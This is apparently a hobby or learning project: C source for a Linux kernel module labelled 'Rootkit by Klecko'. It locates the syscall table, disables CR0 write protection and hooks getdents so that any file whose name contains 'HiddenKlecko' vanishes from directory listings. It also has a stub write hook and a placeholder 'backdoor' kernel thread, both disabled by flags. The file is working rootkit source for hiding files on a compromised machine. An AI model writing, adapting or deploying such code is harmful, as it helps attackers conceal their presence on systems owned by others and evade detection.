#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

#include "helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Klecko");
MODULE_DESCRIPTION("Rootkit by Klecko");
MODULE_VERSION("0.1");

#define HOOK_GETDENTS	1
#define HOOK_WRITE		0
#define BACKDOOR		0

#define HIDE_STR "HiddenKlecko"

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));

// NOTE: don't fucking put a print inside hooks right before calling orig or it will crash for some reason

unsigned long *syscall_table = NULL;
struct task_struct* backdoor_thread;

asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count, long ret);
asmlinkage void sys_write_do_hook(unsigned int fd, const char __user* buf, size_t count);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
asmlinkage long (*sys_getdents_orig)(const struct pt_regs* regs);
asmlinkage long sys_getdents_hook(const struct pt_regs* regs){
	long leidos = sys_getdents_orig(regs);
	return sys_getdents_do_hook(regs->di, regs->si, regs->dx, leidos);
}
asmlinkage long (*sys_write_orig)(const struct pt_regs* regs);
asmlinkage long sys_write_hook(const struct pt_regs* regs){
	long escritos = sys_write_orig(regs);
	sys_write_do_hook(regs->di, regs->si, regs->dx);
	return escritos;
}

#else
asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	long leidos = sys_getdents_orig(fd, dirent, count);
	return sys_getdents_do_hook(fd, dirent, count, leidos);
}
asmlinkage long (*sys_write_orig)(unsigned int fd, const char __user* buf, size_t count);
asmlinkage long sys_write_hook(unsigned int fd, const char __user* buf, size_t count){
	long escritos = sys_write_orig(fd, buf, count);
	sys_write_do_hook(fd, buf, count);
	return escritos;
}

#endif

asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
	int buff_offset, deleted_size;
	struct linux_dirent* currnt;
	//printk(KERN_INFO "ROOTKIT: sysgetdents init\n");

	buff_offset = 0;
	while (buff_offset < ret){
		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
		if (strstr(currnt->d_name, HIDE_STR) != NULL){
			printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
			// Copies the rest of the buffer to the position of the current entry
			deleted_size = currnt->d_reclen;
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
			ret -= deleted_size;
		} else
			buff_offset += currnt->d_reclen;
	}
	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
	return ret;
}

asmlinkage void sys_write_do_hook(unsigned int fd, const char __user* buf, size_t count){
	printk(KERN_INFO "ROOTKIT: hello from sys_write, writing %ld bytes\n", count);
}

//__init para que solo lo haga una vez y después pueda sacarlo de memoria
int __init hooks(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT: Starting hooks\n");

	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
	sys_write_orig = (void*)syscall_table[__NR_write];

	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
	return 0;
}


void __exit unhooks(void){
	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_orig;
	DISABLE_WRITE();
}

static int backdoor_thread_fn(void* data){
	while (!kthread_should_stop()){
		printk(KERN_INFO "ROOTKIT: Hello from thread!\n");
		msleep(5000);
	}
	return 0;
}

void __init start_backdoor(void){
	printk(KERN_INFO "ROOTKIT: Starting backdoor thread\n");
	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "bkd" HIDE_STR); //max name length seems to be 15
	wake_up_process(backdoor_thread);
}

void __exit stop_backdoor(void){
	kthread_stop(backdoor_thread);
}

//insmod
static int lkm_init(void){
    printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
	if (BACKDOOR) start_backdoor();
    return hooks();
}

//rmmod
static void lkm_exit(void){
    printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
	unhooks();
	if (BACKDOOR) stop_backdoor();
}

module_init(lkm_init);
module_exit(lkm_exit);

